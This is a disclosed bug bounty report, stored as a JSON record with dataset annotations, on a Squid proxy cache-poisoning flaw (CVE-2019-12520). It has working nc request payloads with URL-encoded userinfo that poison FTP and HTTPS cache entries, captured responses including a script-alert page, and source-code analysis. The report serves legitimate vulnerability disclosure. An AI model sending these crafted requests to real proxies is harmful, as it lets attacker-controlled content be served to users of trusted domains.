{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "jeriko_one ",
  "title": "Cache Poisoning",
  "content": "\nSummary:\nAn attacker can cause Squid to return to the user attacker controlled data, for any domain. From Squid-4.7 and below both HTTPS and FTP could be poisoned. This is due to Squid URL decoding parts of the Request URL and using that to create a hash. Request that decode to the same URL will retrieve the same cached response even if they're from different domains.\nThe fix for CVE-2019-12524 removed the HTTPS aspect of it, but FTP poisoning was still possible till Squid-4.10.\n<= Squid-4.9 Vulnerable\n<= Squid-4.7 Can also poison HTTPS was reduced to just FTP\nAssigned CVE-2019-12520\nNo Announce was officially made by Squid, and was silently fixed with Squid-4.10. This was going to be announced with http://www.squid-cache.org/Advisories/SQUID-2019_4.txt, but never got published when I demonstrated their patch was incomplete at the time.\nFixed in Squid-4.10\n## Steps To Reproduce:\n### Poisoning FTP Cache in Squid-4.9\n1) Start Squid\n2) Start a FTP Server I attached a python script for this\nCode 23 Bytes\n1ftp_server.py 8080 8081\n3) Make the Request to poison the cache\nCode 446 Bytes\n1echo -e \"GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n2nc: using stream socket\n3HTTP/1.1 200 Gatewaying\n4Server: squid/4.9\n5Mime-Version: 1.0\n6Date: Thu, 19 Mar 2020 15:57:04 GMT\n7Content-Type: text/plain\n8Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT\n9Age: 79\n10X-Cache: HIT from g64\n11Transfer-Encoding: chunked\n12Via: 1.1 g64 (squid/4.9)\n13Connection: keep-alive\n14\n1523\n16Hello! This is from my ftp server.\n17\n180\nThe FTP server should have output similar to\nCode 136 Bytes\n1<- 150 Here comes data\n2Passive Connection from: ('192.168.122.97', 51647)\n3<- Hello! This is from my ftp server.\n4<- 226 Data sent\n5-> QUIT\n4) Now make the request to the actual domain\nNotice the X-Cache: HIT header\nCode 445 Bytes\n1echo -e \"GET ftp://hackerone.com/?@192.168.122.1:8080/payload HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n2\n3nc: using stream socket\n4HTTP/1.1 200 Gatewaying\n5Server: squid/4.9\n6Mime-Version: 1.0\n7Date: Thu, 19 Mar 2020 15:57:04 GMT\n8Content-Type: text/plain\n9Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT\n10Age: 249\n11X-Cache: HIT from g64\n12Transfer-Encoding: chunked\n13Via: 1.1 g64 (squid/4.9)\n14Connection: keep-alive\n15\n1623\n17Hello! This is from my ftp server.\n18\n190\n20\nYou will get the output from the cached response instead of the real response from hackerone.com or whichever domain you're poisoning\nPoisoning HTTPS Cache in Squid-4.7\nTo repro the HTTPS poisoning you need to configure Squid to cache SSL request. This involves generating a root cert, and inserting some config options. https://wiki.squid-cache.org/Features/DynamicSslCert Has steps on how to achieve this. Below is what I added to my config. You will need to change the prefixes to match your system.\nReplace the existing http_port 3128 entry with the following:\nCode 281 Bytes\n1http_port 3128 ssl-bump \\\n2       generate-host-certificates=on dynamic_cert_mem_cache_size=4MB \\\n3       cert=/home/j1/h4x/squid/certs/myCA.pem\n4sslcrtd_program /home/j1/h4x/squid/ship/squid-4.7/libexec/security_file_certgen -s /home/j1/h4x/squid/ship/squid-4.7/var/lib/ssl_db -M 4MB\nIf your test certs aren't valid (self signed for testing) you need to add the following directive in the config.\nCode 29 Bytes\n1sslproxy_cert_error allow all\nFinally you'll need to initalize the SSL DB that you've told Squid to use. This is the -s option in sslcrtd_program\nCode 78 Bytes\n1./libexec/security_file_certgen ./var/lib/ssl_db -c -s ./var/lib/ssl_db -M 4MB\nYou're also going to need a server with SSL that you can control the headers on.\nYou have to send the following header so that Squid will cache your response.\nCode 50 Bytes\n1Cache-Control: public, immutable, max-age=31536000\nOnce you've done that you're ready to repo HTTPS poisoning which is essentially the same as our FTP Poisoning.\n1) Start Squid\nCode 12 Bytes\n1./sbin/squid\n2) start you SSL Server\n3) Make a poison request\nCode 518 Bytes\n1echo -e \"GET https://hackerone.com%2f%3f@192.168.122.1:8080/html/alert.html HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n2\n3nc: using stream socket\n4HTTP/1.1 200 OK\n5Server: SimpleHTTP/0.6 Python/3.6.10\n6Date: Thu, 19 Mar 2020 16:17:46 GMT\n7Content-Type: text/html\n8Content-Length: 74\n9Last-Modified: Mon, 22 Apr 2019 23:18:08 GMT\n10Cache-Control: public, immutable, max-age=31536000\n11X-Cache: MISS from g64\n12Via: 1.1 g64 (squid/4.7)\n13Connection: keep-alive\n14\n15<html>\n16\t<body>\n17\t\t<script>alert(document.domain)</script>\n18\t</body>\n19</html>\n4) Make the request to the real domain\nNotice the X-Cache: HIT header\nCode 521 Bytes\n1echo -e \"GET https://hackerone.com/?@192.168.122.1:8080/html/alert.html HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n2nc: using stream socket\n3HTTP/1.1 200 OK\n4Server: SimpleHTTP/0.6 Python/3.6.10\n5Date: Thu, 19 Mar 2020 16:17:46 GMT\n6Content-Type: text/html\n7Content-Length: 74\n8Last-Modified: Mon, 22 Apr 2019 23:18:08 GMT\n9Cache-Control: public, immutable, max-age=31536000\n10Age: 334\n11X-Cache: HIT from g64\n12Via: 1.1 g64 (squid/4.7)\n13Connection: keep-alive\n14\n15<html>\n16\t<body>\n17\t\t<script>alert(document.domain)</script>\n18\t</body>\n19</html>\nAnalysis\nWhen making a request Squid will check its cache to see if it has a response\nthat it can serve up. When squid determines that a reply can be cached it uses\na combination of METHOD, absolute URL, and possible vary headers to form a\nMD5 hash.\nThis takes place in storeKeyPUblicByRequestMethod\nCode 112 Bytes\n1    SquidMD5Update(&M, &m, sizeof(m));\n2    SquidMD5Update(&M, (unsigned char *) url.rawContent(), url.length());\nSimilar to the ACL Bypass vuln I reported earlier this abuses that the userInfo is decoded and is stored as part of the url. So when url is used to update the hash it's using a decoded string\nCode 1.15 KiB\n1effectiveRequestUri() will return url.absolute() for methods that aren't\n2CONNECT and schemes that aren't PROTO_AUTHORITY_FORM\n3\n4 Looking at Uri::absolute we see that the userInfo is included into the\n5 absolute uri representation if the protocol is HTTPS\n6\n7             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||\n8                                      getScheme() != AnyP::PROTO_HTTPS ||\n9                                      userInfo().isEmpty();\n10            if (!omitUserInfo) {\n11                absolute_.append(userInfo());\n12                absolute_.append(\"@\", 1);\n13            }\n14\n15userInfo is set in Uri::parse if the foundHost contains a @ that\n16the userinfo is extracted and then decoded.\n17\n18        t = strrchr(foundHost, '@');\n19        if (t != NULL) {\n20            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);\n21            login[sizeof(login)-1] = '\\0';\n22            t = strrchr(login, '@');\n23            *t = 0;\n24            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);\n25            foundHost[sizeof(foundHost)-1] = '\\0';\n26            // Bug 4498: URL-unescape the login info after extraction\n27            rfc1738_unescape(login);\n28        }\nThis is eventually stored in userInfo when calling parseFinish\nparseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);\nThis userInfo is the decoded version, therefore special tokens such as ? # /\nare possible entries in the userInfo.\nIt's possible to have a cache entry for one domain, be used for another\ndomain. Leading to possible HTML/JS execution in a target domain. The\nrequirement being that it must have the HTTPS protocol.\nThis can lead to Squid serving the wrong\nReply as multiple request from different domains can look similar.\nTake for example the following:\nhttps://squid-cache.org%2F%3F@192.168.1.23:8080/\nThe reply from 192.168.1.23 would decode to\nhttps://squid-cache.org/?@192.168.1.23:8080/\nAnd the reply would be stored\nNow if a real request for squid-cache.org came in with a similar URL\nhttps://squid-cache.org?@192.168.1.23:8080/\nThe cached reply would be served, and any scripts that were returned by\nthe original request would now be running in squid-cache.org context.\nImpact\nAttacker can poison the Cache causing users to receive attacker controlled data when going to a trusted domain.\nSquid-4.9 And below allows an attacker to poison FTP responses, a user could download attacker controlled data thinking it came from a legitiment source.\n<= Squid-4.7 Can also poison HTTPS allowing attacker controlled content to run in another domain.\nThese both require a user to visit a specially crafted URL.\n\n",
  "severity": [
    8.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Handling of URL Encoding (Hex Encoding)"
  ],
  "screenshots": {},
  "disclosed_date": 1630034760,
  "report_url": "https://hackerone.com/reports/824753",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Start Squid and an FTP server"
    ],
    [
      2,
      "Send a specially crafted GET request with URL-encoded characters to poison the cache"
    ],
    [
      3,
      "Send a normal GET request to the target domain to retrieve the poisoned cache"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to poison Squid's cache by exploiting how Squid URL decodes parts of the request URL to create a hash. This causes Squid to serve attacker-controlled data for any domain when the cache is accessed, as requests that decode to the same URL will retrieve the same cached response regardless of the domain.",
  "reason": "The attack requires understanding of URL encoding/decoding, cache mechanisms, and the specific way Squid handles FTP and HTTPS requests. The interaction between URL decoding and cache key generation is subtle and not immediately obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}